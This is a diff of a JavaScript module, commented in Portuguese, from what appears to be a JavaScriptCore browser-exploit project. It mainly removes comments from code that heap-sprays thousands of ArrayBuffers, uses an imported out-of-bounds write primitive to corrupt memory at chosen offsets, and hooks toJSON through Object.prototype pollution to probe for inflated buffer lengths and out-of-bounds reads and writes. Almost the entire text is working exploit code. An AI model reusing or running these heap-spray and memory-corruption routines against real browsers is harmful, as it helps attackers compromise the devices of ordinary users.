@@ -7,13 +7,12 @@ import {
     oob_write_absolute,
     clearOOBEnvironment
 } from '../core_exploit.mjs';
-import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs'; // JSC_OFFSETS pode não ser usado diretamente aqui, mas OOB_CONFIG sim.
+import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';
 
 // toJSON que sonda 'this' (ArrayBuffer) e tenta R/W OOB se o tamanho estiver inflado
-// Esta é a v3 que se mostrou estável em testes anteriores para ArrayBuffers.
 export function toJSON_AttemptWriteToThis_v3() {
     let initial_buffer_size_for_oob_check;
-    const original_sprayed_ab_size = 64; // Tamanho dos ArrayBuffers pulverizados
+    const original_sprayed_ab_size = 64; 
 
     if (typeof oob_array_buffer_real !== 'undefined' && this === oob_array_buffer_real) {
         initial_buffer_size_for_oob_check = OOB_CONFIG.BASE_OFFSET_IN_DV + OOB_CONFIG.ALLOCATION_SIZE + 128;
@@ -56,15 +55,14 @@ export function toJSON_AttemptWriteToThis_v3() {
                 }
             } catch (e_dv_internal) {
                 result_payload.error_in_toJSON = (result_payload.error_in_toJSON || "") + `Internal DV RW Error: ${e_dv_internal.name}; `;
-                result_payload.dataview_created = false; // Marcar como falha se a DV interna falhou
+                result_payload.dataview_created = false;
             }
         } else {
             result_payload.error_in_toJSON = (result_payload.error_in_toJSON || "") + `this (AB) too small for internal RW (size: ${this.byteLength}); `;
         }
 
-        // Tentativa de Leitura OOB se o byteLength for MAIOR que o esperado para este buffer
         if (typeof result_payload.byteLength_prop === 'number' && result_payload.byteLength_prop > initial_buffer_size_for_oob_check) {
-            const oob_read_target_offset = initial_buffer_size_for_oob_check + 4; // Ler 4 bytes após o fim original esperado
+            const oob_read_target_offset = initial_buffer_size_for_oob_check + 4;
             result_payload.oob_read_offset_attempted = toHex(oob_read_target_offset);
             if (this.byteLength >= oob_read_target_offset + 4) {
                 try {
@@ -92,25 +90,19 @@ export async function executeAggressiveHeapSprayAndCorruptTest() {
     logS3(`--- Iniciando Teste: Spray Agressivo de AB, Corrupção OOB Múltipla, e Sondagem ---`, "test", FNAME_TEST);
     document.title = `AggroSpray & Corrupt AB`;
 
-    const spray_count = 5000; // Aumentado significativamente
+    const spray_count = 5000; 
     const victim_size = 64;
     const sprayed_victim_abs = [];
 
-    // Offsets dentro do oob_array_buffer_real para tentar a corrupção
-    // Estes são relativos ao início do oob_array_buffer_real.
-    // (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) é onde oob_dataview_real começa.
-    // 0x70 é (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16 (com BASE_OFFSET_IN_DV = 128 -> 112)
-    // Estamos interessados em offsets próximos à "janela" do oob_dataview_real ou áreas críticas.
-    const base_corruption_zone_start = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 32; // Começa um pouco antes da oob_dataview
+    const base_corruption_zone_start = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 32; 
     const corruption_offsets_to_try = [];
-    for (let i = 0; i < 10; i++) { // Ex: 10 offsets diferentes, de 4 em 4 bytes
+    for (let i = 0; i < 10; i++) { 
         corruption_offsets_to_try.push(base_corruption_zone_start + (i * 4));
     }
-    // Adiciona o offset 0x70 (112) se não estiver já na faixa, como um ponto de interesse conhecido
     if (!corruption_offsets_to_try.includes(112)) corruption_offsets_to_try.push(112);
 
 
-    const value_to_write = 0xFFFFFFFF; // Valor de corrupção principal
+    const value_to_write = 0xFFFFFFFF; 
     const bytes_to_write = 4;
 
     logS3(`1. Pulverizando ${spray_count} ArrayBuffers de ${victim_size} bytes cada...`, "info", FNAME_TEST);
@@ -131,9 +123,8 @@ export async function executeAggressiveHeapSprayAndCorruptTest() {
     let pollutionApplied = false;
     let any_corruption_found = false;
 
-    // Sondar um subconjunto dos sprayed_victim_abs para economizar tempo
-    const probe_step = Math.max(1, Math.floor(spray_count / 20)); // Sondar ~20 ABs
-    const max_probes = 50; // Limite máximo de sondagens para não demorar demais
+    const probe_step = Math.max(1, Math.floor(spray_count / 20)); 
+    const max_probes = 50; 
     let probes_done = 0;
 
     for (let i = 0; i < sprayed_victim_abs.length && probes_done < max_probes; i += probe_step) {
@@ -143,12 +134,12 @@ export async function executeAggressiveHeapSprayAndCorruptTest() {
         logS3(`\n--- Sondando sprayed_victim_abs[${i}] (ID conceitual: Victim-${i}) ---`, 'subtest', FNAME_TEST);
 
         for (const corruption_offset of corruption_offsets_to_try) {
-            if (any_corruption_found) break; // Parar se já encontramos algo
+            if (any_corruption_found) break; 
 
             document.title = `SprayAB - Probe ${i}, Offs ${toHex(corruption_offset)}`;
             logS3(`  Tentando corrupção em oob_ab[${toHex(corruption_offset)}] para Victim-${i}...`, "info", FNAME_TEST);
 
-            await triggerOOB_primitive(); // Reconfigura oob_array_buffer_real para cada tentativa de corrupção
+            await triggerOOB_primitive(); 
             if (!oob_array_buffer_real) {
                 logS3("  Falha OOB Setup para esta tentativa. Pulando.", "error", FNAME_TEST);
                 continue;
@@ -160,18 +151,16 @@ export async function executeAggressiveHeapSprayAndCorruptTest() {
                     continue;
                 }
                 oob_write_absolute(corruption_offset, value_to_write, bytes_to_write);
-                // logS3(`    Escrita OOB em oob_array_buffer_real[${toHex(corruption_offset)}] realizada.`, "info", FNAME_TEST);
             } catch (e_write) {
                 logS3(`    ERRO na escrita OOB para offset ${toHex(corruption_offset)}: ${e_write.message}.`, "error", FNAME_TEST);
-                clearOOBEnvironment(); // Limpa oob_array_buffer_real antes de continuar o loop externo
+                clearOOBEnvironment(); 
                 continue;
             }
 
-            await PAUSE_S3(SHORT_PAUSE_S3); // Pausa após corrupção
+            await PAUSE_S3(SHORT_PAUSE_S3); 
 
             let stringifyResult = null;
-            let errorInStringify = null;
-            pollutionApplied = false; // Resetar para cada tentativa de stringify
+            pollutionApplied = false; 
 
             try {
                 Object.defineProperty(Object.prototype, ppKey_val, {
@@ -180,7 +169,7 @@ export async function executeAggressiveHeapSprayAndCorruptTest() {
                 });
                 pollutionApplied = true;
 
-                stringifyResult = JSON.stringify(current_victim_ab); // Sondando o sprayed_victim_ab[i]
+                stringifyResult = JSON.stringify(current_victim_ab); 
 
                 if (stringifyResult && stringifyResult.toJSON_executed === "toJSON_AttemptWriteToThis_v3") {
                     if (stringifyResult.error_in_toJSON) {
@@ -205,19 +194,17 @@ export async function executeAggressiveHeapSprayAndCorruptTest() {
                 }
 
             } catch (e_str) {
-                errorInStringify = e_str;
                 logS3(`    !!!! ERRO AO STRINGIFY Victim-${i} (Corrupção em oob_ab[${toHex(corruption_offset)}]) !!!!: ${e_str.name} - ${e_str.message}`, "error", FNAME_TEST);
-                // Não quebrar aqui, pode ser um erro isolado.
             } finally {
                 if (pollutionApplied) {
                     if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONDescriptor);
                     else delete Object.prototype[ppKey_val];
                 }
             }
-            clearOOBEnvironment(); // Limpar oob_array_buffer_real para a próxima tentativa de offset
+            clearOOBEnvironment(); 
             if (any_corruption_found) break;
-            await PAUSE_S3(10); // Pequena pausa entre offsets de corrupção
-        } // Fim do loop de corruption_offsets
+            await PAUSE_S3(10); 
+        } 
 
         probes_done++;
         if (any_corruption_found) {
@@ -225,16 +212,16 @@ export async function executeAggressiveHeapSprayAndCorruptTest() {
             break;
         }
         if (probes_done < max_probes && i + probe_step < sprayed_victim_abs.length) {
-            await PAUSE_S3(50); // Pausa antes de sondar o próximo AB do spray
+            await PAUSE_S3(50); 
         }
-    } // Fim do loop de sprayed_victim_abs
+    } 
 
     if (!any_corruption_found) {
         logS3("Nenhuma corrupção óbvia (alteração de tamanho, leitura OOB) detectada nos ArrayBuffers pulverizados após múltiplas tentativas de corrupção.", "good", FNAME_TEST);
     }
 
     logS3(`--- Teste Spray Agressivo e Corrupção Múltipla CONCLUÍDO ---`, "test", FNAME_TEST);
-    clearOOBEnvironment(); // Garante limpeza final
+    clearOOBEnvironment(); 
     sprayed_victim_abs.length = 0;
     globalThis.gc?.();
     document.title = any_corruption_found ? document.title : `AggroSpray Done (No Hits)`;
